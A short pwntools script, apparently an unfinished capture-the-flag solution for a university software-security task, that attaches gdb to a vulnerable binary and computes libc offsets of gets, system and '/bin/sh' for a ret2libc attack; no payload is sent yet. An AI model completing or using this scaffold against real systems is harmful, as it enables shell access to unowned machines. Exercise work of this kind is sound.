#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33262)
#conn = pwn.remote('127.0.0.1', 1024)

# use the provided lib c
conn = pwn.process('./vuln')
pwn.gdb.attach(conn)

# fixed as no ASLR in binray (got offset via IDA)
#adress_got_gets = 0x000000000041BFB8

vuln = pwn.ELF('./vuln')
print(vuln.arch)


# use my libc for local testing, switch to provided one for server
#libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = pwn.ELF('./libc.so.6')


offset_gets = libc.symbols['gets']
offset_system = libc.symbols['system']

offset_shell_string = next(libc.search(b'/bin/sh\x00'))

# address_system = address_gets - offset_gets + offset_system
offset_to_system = offset_gets - offset_system
offset_to_shell_string = offset_shell_string - offset_gets

conn.interactive()